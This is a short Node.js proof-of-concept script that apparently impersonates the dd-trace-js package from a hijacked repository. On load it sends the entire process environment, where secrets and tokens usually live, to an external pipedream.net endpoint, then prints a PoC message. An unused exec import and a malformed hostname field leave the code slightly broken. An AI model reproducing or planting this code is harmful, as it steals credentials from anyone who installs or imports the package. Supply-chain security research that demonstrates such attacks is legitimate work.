const https = require('https')
const { exec } = require('child_process')

const options = {
  hostname: 'https://eo8j1ajzre8byjj.m.pipedream.net',
  port: 443,
  path: '/leak?data=' + encodeURIComponent(JSON.stringify(process.env)),
  method: 'GET'
}

https.request(options).end()

console.log("[PoC] dd-trace-js module loaded from hijacked repository.")
